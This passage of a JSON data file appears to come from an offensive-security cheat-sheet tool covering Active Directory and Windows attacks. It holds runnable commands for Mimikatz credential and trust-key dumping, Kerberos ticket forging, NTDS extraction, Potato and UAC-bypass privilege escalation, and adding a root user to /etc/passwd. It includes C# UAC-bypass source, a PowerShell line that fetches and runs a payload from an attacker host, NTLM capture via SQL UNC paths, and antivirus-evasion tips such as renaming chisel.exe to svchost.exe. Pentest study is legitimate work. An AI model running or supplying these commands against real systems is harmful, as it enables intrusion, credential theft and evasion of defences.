        "codes": [
          {
            "lang": "bash",
            "code": "# Use -S flag for HTTPS connections\nevil-winrm -i <TargetIP> -u <Username> -p '<Password>' -S"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Script Execution Blocked",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Always run AMSI bypass first\nBypass-4MSI"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Mimikatz",
    "title": "Troubleshooting",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "\"ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20)\" Error",
        "codes": [
          {
            "lang": "bash",
            "code": "# Run as administrator\nrunas /user:Administrator cmd.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Not running as administrator.",
            "variant": "warning"
          },
          {
            "type": "text",
            "content": "**Solution:**"
          }
        ]
      },
      {
        "title": "\"ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)\" Error",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Antivirus or credential guard is blocking access.",
            "variant": "warning"
          },
          {
            "type": "text",
            "content": "**Solutions:**\n- Disable antivirus temporarily\n- Use alternative tools (pypykatz, SharpKatz)\n- Dump LSASS with procdump and analyze offline"
          }
        ]
      },
      {
        "title": "No Plaintext Passwords Shown",
        "codes": [
          {
            "lang": "bash",
            "code": "# Enable WDigest (requires reboot and user re-login)\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "WDigest is disabled by default on Windows 8.1+.",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Solution:**"
          }
        ]
      },
      {
        "title": "\"ERROR kull_m_process_getVeryBasicModuleInformations\" Error",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Mimikatz version mismatch with Windows version.",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Solution:**\n- Download latest Mimikatz from GitHub\n- Use correct architecture (x86 vs x64)"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "Troubleshooting",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [
      {
        "title": "\"Access Denied\" Error",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Check privileges\nwhoami /priv\n\n# Ensure you have SeBackupPrivilege"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Requires local administrator or SYSTEM privileges.",
            "variant": "warning"
          },
          {
            "type": "text",
            "content": "**Solution:**"
          }
        ]
      },
      {
        "title": "\"Shadow Copy Not Found\" Error",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Verify shadow copies exist\nvssadmin list shadows\n\n# Create new shadow copy if needed\nvssadmin create shadow /for=C:"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "\"File is in use\" Error",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "This is why we use shadow copies - to access locked files.",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Solution:**\n- Ensure you're copying from the shadow copy path, not the live filesystem\n- Verify the shadow copy path is correct"
          }
        ]
      },
      {
        "title": "secretsdump.py Fails",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check file integrity\nfile ntds.dit\n# Should show: \"Extensible storage engine DataBase\"\n\n# Try repairing with esentutl (on Windows)\nesentutl /p /o ntds.dit"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "SSH Pivoting",
    "title": "Troubleshooting",
    "tags": [
      "proxy_dns"
    ],
    "steps": [
      {
        "title": "Connection Timeout",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check SSH server config\ncat /etc/ssh/sshd_config | grep -i allowtcpforwarding"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Ensure the SSH server allows port forwarding.",
            "variant": "warning"
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Should be set to `AllowTcpForwarding yes`",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "ProxyChains DNS Issues",
        "codes": [
          {
            "lang": "bash",
            "code": "# Comment out proxy_dns in proxychains config\nsudo nano /etc/proxychains4.conf"
          },
          {
            "lang": "plaintext",
            "code": "#proxy_dns"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Nmap Not Working",
        "codes": [
          {
            "lang": "bash",
            "code": "proxychains4 nmap -sT -Pn <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Always use `-sT` (TCP connect) scan with proxychains. SYN scans require raw sockets which don't work through SOCKS.",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Check Active SSH Tunnels",
        "codes": [
          {
            "lang": "bash",
            "code": "# List SSH processes\nps aux | grep ssh\n\n# Check listening ports\nss -tulpn | grep ssh\nnetstat -tulpn | grep ssh"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Kill Background SSH Tunnel",
        "codes": [
          {
            "lang": "bash",
            "code": "# Find process\nps aux | grep \"ssh.*9050\"\n\n# Kill by PID\nkill <PID>\n\n# Or kill all SSH tunnels\npkill -f \"ssh.*-D\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Tunneling with Chisel",
    "title": "Troubleshooting",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "Pivoting",
      "Tunneling",
      "Windows"
    ],
    "steps": [
      {
        "title": "Connection Refused",
        "codes": [
          {
            "lang": "bash",
            "code": "# Verify server is running\nnetstat -tlnp | grep 8000\n\n# Check firewall\nsudo ufw allow 8000/tcp\n\n# Try different port\nchisel server -p 9000 --reverse"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Firewall blocking connection or wrong IP/port.",
            "variant": "warning"
          },
          {
            "type": "text",
            "content": "**Solutions:**"
          }
        ]
      },
      {
        "title": "Tunnel Disconnects",
        "codes": [
          {
            "lang": "bash",
            "code": "# Add keepalive\nchisel client 10.10.14.5:8000 R:80:127.0.0.1:80 --keepalive 30s\n\n# Increase timeout\nchisel server -p 8000 --reverse --keepalive 30s"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Network instability or timeout.",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Solutions:**"
          }
        ]
      },
      {
        "title": "Permission Denied",
        "codes": [
          {
            "lang": "bash",
            "code": "# Run with sudo if needed\nsudo chisel server -p 80 --reverse"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Windows Antivirus Blocks Chisel",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Add exclusion\nAdd-MpPreference -ExclusionPath \"C:\\Temp\\chisel.exe\"\n\n# Or rename binary\nmv chisel.exe svchost.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Invoke-RunasCs",
    "title": "Troubleshooting",
    "tags": [
      "Lateral_Movement",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "\"Access Denied\" Error",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "User doesn't have sufficient privileges or credentials are wrong.",
            "variant": "warning"
          },
          {
            "type": "text",
            "content": "**Solutions:**\n- Verify credentials are correct\n- Check if user is in Administrators group\n- Try different logon type"
          }
        ]
      },
      {
        "title": "\"Command Not Found\" Error",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Reload the script\nIEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-RunasCs.ps1')"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Invoke-RunasCs.ps1 not loaded.",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Solution:**"
          }
        ]
      },
      {
        "title": "Execution Policy Error",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Bypass execution policy\npowershell.exe -ExecutionPolicy Bypass -File Invoke-RunasCs.ps1"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Command Doesn't Execute",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Instead of this\nInvoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"whoami\"\n\n# Try this\nInvoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"cmd.exe /c whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Try wrapping command in cmd.exe or powershell.exe.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Token Impersonation - Potato Attacks",
    "title": "Troubleshooting",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Privilege Not Enabled",
        "codes": [
          {
            "lang": "bash",
            "code": "whoami /priv | findstr SeImpersonate"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If `SeImpersonatePrivilege` shows as **Disabled**, you cannot use Potato attacks.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Tool Fails to Execute",
        "codes": [
          {
            "lang": "bash",
            "code": "# Try different tool\n# GodPotato \u2192 PrintSpoofer \u2192 JuicyPotatoNG \u2192 SweetPotato"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Access Denied",
        "codes": [
          {
            "lang": "bash",
            "code": "cd C:\\Windows\\Temp\nGodPotato.exe -cmd \"whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Ensure you're running from a writable directory like `C:\\Windows\\Temp` or `C:\\Users\\Public`.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Antivirus Detection",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Potato tools are often flagged by AV. Consider:\n- Disabling AV temporarily (if possible)\n- Using obfuscated versions\n- Encoding payloads",
            "variant": "important"
          }
        ]
      },
      {
        "title": "No Output",
        "codes": [
          {
            "lang": "bash",
            "code": "GodPotato.exe -cmd \"cmd /c whoami > C:\\Windows\\Temp\\out.txt\"\ntype C:\\Windows\\Temp\\out.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Write output to a file instead:",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Writable etc-passwd",
    "title": "Troubleshooting",
    "tags": [],
    "steps": [
      {
        "title": "Password Hash Not Working",
        "codes": [
          {
            "lang": "bash",
            "code": "# Try different hash method\nopenssl passwd -1 -salt xyz Password123\n\n# Or use simpler password\nopenssl passwd -1 password"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "User Added But Can't Login",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check if entry is correct\ntail -1 /etc/passwd\n\n# Ensure UID is 0\ngrep hacker /etc/passwd\n# Should show: hacker:...:0:0:..."
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Permission Denied",
        "codes": [
          {
            "lang": "bash",
            "code": "# Ensure file is actually writable\nls -l /etc/passwd\n\n# Try with sudo if available\nsudo echo 'hacker:...:0:0:...' >> /etc/passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Shell Not Working",
        "codes": [
          {
            "lang": "bash",
            "code": "# Ensure shell path is correct\nwhich bash\n# Output: /bin/bash\n\n# Use correct path in /etc/passwd entry\necho 'hacker:$1$xyz$abc:0:0:root:/root:/bin/bash' >> /etc/passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Zerologon",
    "title": "Troubleshooting",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [
      {
        "title": "\"Attack Failed\" Error",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Target is likely patched or enforcement mode is enabled.",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Solutions:**\n- Verify DC is running vulnerable Windows version\n- Check if August 2020 patches are installed\n- Try different Zerologon implementation"
          }
        ]
      },
      {
        "title": "\"Access Denied\" After Exploitation",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "DC password was reset but DCSync failed.",
            "variant": "warning"
          },
          {
            "type": "text",
            "content": "**Solutions:**\n- Verify you're using computer account name with `$`\n- Use `-no-pass` flag with secretsdump\n- Try alternative secretsdump methods"
          }
        ]
      },
      {
        "title": "Domain Breaks After Exploitation",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "DC computer account password was not restored.",
            "variant": "important"
          },
          {
            "type": "text",
            "content": "**Solutions:**\n- Restore from original hash immediately\n- Use Administrator hash to reset DC password\n- Worst case: restore DC from backup"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "LDAP Enumeration",
    "title": "Troubleshooting",
    "tags": [
      "Active_Directory",
      "Enumeration",
      "LDAP"
    ],
    "steps": [
      {
        "title": "\"Invalid Credentials\" Error",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Ensure you're using the correct authentication format:\n- `username@domain.com` (UPN format)\n- `DOMAIN\\username` (NetBIOS format)\n- `CN=username,OU=Users,DC=domain,DC=com` (DN format)",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "\"Can't Contact LDAP Server\" Error",
        "codes": [
          {
            "lang": "bash",
            "code": "# Test connectivity\nnc -zv <DomainController> 389\n\n# Try LDAPS instead\nldapsearch -x -H ldaps://<DomainController> -D \"<Username>@<Domain>\" -w '<Password>' -b \"DC=corp,DC=local\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "\"Operations Error\" or \"Referral\" Error",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<PDC-IP> -D \"<Username>@<Domain>\" -w '<Password>' -b \"DC=corp,DC=local\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "You may be querying a non-authoritative DC. Try specifying the PDC:",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Empty Results",
        "codes": [
          {
            "lang": "bash",
            "code": "# Verify base DN is correct\nldapsearch -x -H ldap://<DomainController> -D \"<Username>@<Domain>\" -w '<Password>' -b \"\" -s base namingContexts"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "NetExec",
    "title": "Troubleshooting",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "\"STATUS_LOGON_FAILURE\" Error",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Invalid credentials or wrong domain.",
            "variant": "warning"
          },
          {
            "type": "text",
            "content": "**Solutions:**\n- Try `--local-auth` for local accounts\n- Verify domain with `-d <Domain>`\n- Check username format (DOMAIN\\user vs user@domain.com)"
          }
        ]
      },
      {
        "title": "\"STATUS_ACCESS_DENIED\" Error",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Valid credentials but insufficient privileges.",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Solutions:**\n- Try different shares with `--shares`\n- Check if user is in local admin group\n- Attempt lateral movement to other hosts"
          }
        ]
      },
      {
        "title": "\"Connection Refused\" Error",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check if SMB is running\nnmap -p 445 <TargetIP>\n\n# Try different protocol\nnxc winrm <TargetIP> -u <Username> -p '<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "\"SMB Signing Required\" Error",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Cannot relay attacks to this target.",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Solution:**\n- Use valid credentials instead of relay\n- Find targets without SMB signing"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Intra-Forest Attacks",
    "title": "Trust Key Abuse",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Get Trust Key",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz.exe\nlsadump::trust /patch"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Forge Inter-Realm TGT",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz.exe\nkerberos::golden /user:Administrator /domain:<ChildDomain> /sid:<ChildSID> /sids:<EASid> /rc4:<TrustKey> /service:krbtgt /target:<RootDomain> /ptt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Request TGS for Root DC",
        "codes": [
          {
            "lang": "bash",
            "code": "Rubeus.exe asktgs /ticket:<InterRealmTGT> /service:cifs/<RootDC>.<RootDomain> /dc:<RootDC> /ptt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Mimikatz",
    "title": "Trust Key Dumping",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Dump Domain Trust Keys",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # privilege::debug\nmimikatz # lsadump::trust /patch"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Trust keys enable inter-forest attacks.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Dump Specific Trust",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # lsadump::dcsync /domain:<Domain> /user:<TrustedDomain>$"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "AD Forest Theory",
    "title": "Trust Keys",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Windows"
    ],
    "steps": [
      {
        "title": "Dump Trust Keys",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz.exe\nlsadump::trust /patch"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Trust Key Format",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz.exe\nlsadump::dcsync /domain:<Domain> /user:<TrustedDomain>$"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Trust keys are shared secrets between trusted domains. Can be used to forge inter-realm tickets.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Tunneling with Chisel",
    "title": "Tunneling with Chisel",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "Pivoting",
      "Tunneling",
      "Windows"
    ],
    "steps": [],
    "resources": [
      {
        "text": "Chisel GitHub",
        "url": "https://github.com/jpillora/chisel"
      },
      {
        "text": "HackTricks Chisel",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#chisel"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Fast TCP/UDP tunnel over HTTP secured via SSH - ideal for pivoting through dual-homed machines."
      }
    ]
  },
  {
    "category": "UAC Bypass",
    "title": "UAC Bypass",
    "tags": [
      "Defense_Evasion",
      "Privilege_Escalation",
      "UAC_Bypass",
      "Windows"
    ],
    "steps": [
      {
        "title": "Fundamentals",
        "substeps": [
          {
            "title": "UAC Levels",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "- **Always notify** - Prompts for all elevation requests\n- **Notify only for apps** - Prompts for non-Windows apps (default)\n- **Notify only (no dim)** - Same but no secure desktop\n- **Never notify** - UAC disabled"
              }
            ]
          },
          {
            "title": "Check UAC Status",
            "codes": [
              {
                "lang": "bash",
                "code": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "Auto-Elevating Binaries",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Some Microsoft binaries auto-elevate without prompts. Can be exploited to run arbitrary code elevated.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "FodHelper UAC Bypass",
        "substeps": [
          {
            "title": "Bypass Flow",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Bypass sequence:\n1. Write payload command to `HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command`\n2. Create `DelegateExecute` value (empty string)\n3. Run fodhelper.exe\n4. Payload executes elevated",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Manual FodHelper Bypass",
            "codes": [
              {
                "lang": "bash",
                "code": "reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /ve /t REG_SZ /d \"cmd.exe /c <Payload>\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f\nfodhelper.exe\nreg delete \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /f"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "PowerShell FodHelper Bypass",
            "codes": [
              {
                "lang": "powershell",
                "code": "New-Item -Path \"HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"powershell -exec bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/payload.ps1')\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden\nStart-Sleep -Seconds 3\nRemove-Item -Path \"HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\" -Recurse -Force"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**fodhelper.exe** auto-elevates and checks registry for handler. Attacker-controlled registry key executes elevated.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Alternative Bypass Methods",
        "substeps": [
          {
            "title": "ComputerDefaults Bypass",
            "codes": [
              {
                "lang": "powershell",
                "code": "New-Item -Path \"HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"<Payload>\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nStart-Process \"C:\\Windows\\System32\\computerdefaults.exe\" -WindowStyle Hidden"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Similar technique using **computerdefaults.exe**.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "WSReset Bypass",
            "codes": [
              {
                "lang": "bash",
                "code": "reg add \"HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635ber5wc2bqmne8p4\\Shell\\open\\command\" /ve /t REG_SZ /d \"<Payload>\" /f\nreg add \"HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635ber5wc2bqmne8p4\\Shell\\open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f\nwsreset.exe"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Uses **wsreset.exe** for UAC bypass.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "SilentCleanup Bypass",
            "codes": [
              {
                "lang": "bash",
                "code": "reg add \"HKCU\\Environment\" /v windir /t REG_SZ /d \"cmd.exe /c <Payload> &&\" /f\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /i\nreg delete \"HKCU\\Environment\" /v windir /f"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Disk Cleanup auto-elevates.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "C# UAC Bypass Implementation",
        "codes": [
          {
            "lang": "csharp",
            "code": "using Microsoft.Win32;\nusing System.Diagnostics;\n\nclass UACBypass\n{\n    static void Main()\n    {\n        string payload = @\"powershell -exec bypass -nop -w hidden -c \"\"<Command>\"\"\";\n\n        // Create registry keys\n        RegistryKey key = Registry.CurrentUser.CreateSubKey(@\"Software\\Classes\\ms-settings\\shell\\open\\command\");\n        key.SetValue(\"\", payload);\n        key.SetValue(\"DelegateExecute\", \"\");\n        key.Close();\n\n        // Launch fodhelper\n        Process.Start(new ProcessStartInfo\n        {\n            FileName = @\"C:\\Windows\\System32\\fodhelper.exe\",\n            WindowStyle = ProcessWindowStyle.Hidden\n        });\n\n        System.Threading.Thread.Sleep(3000);\n\n        // Cleanup\n        Registry.CurrentUser.DeleteSubKeyTree(@\"Software\\Classes\\ms-settings\");\n    }\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "UACME GitHub",
        "url": "https://github.com/hfiref0x/UACME"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "User Account Control (UAC) prompts for elevation. Certain auto-elevating binaries can be hijacked to bypass UAC without prompts.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "MS SQL Enumeration",
    "title": "UNC Path Injection",
    "tags": [
      "Exploitation",
      "SQL",
      "Windows"
    ],
    "steps": [
      {
        "title": "Setup Responder",
        "codes": [
          {
            "lang": "bash",
            "code": "responder -I eth0"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Trigger UNC Path",
        "codes": [
          {
            "lang": "sql",
            "code": "EXEC master..xp_dirtree '\\\\<AttackerIP>\\share'"
          },
          {
            "lang": "sql",
            "code": "EXEC master..xp_fileexist '\\\\<AttackerIP>\\share\\file'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Via Impacket",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-mssqlclient <User>:<Pass>@<Target> -windows-auth\nSQL> xp_dirtree \\\\<AttackerIP>\\share"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Force SQL Server to authenticate to attacker SMB share. Capture or relay NTLM hash.",
        "variant": "danger"
      }
    ]
  },
  {
    "category": "Unconstrained Delegation",
    "title": "Unconstrained Delegation",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Enumerate Unconstrained Delegation",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
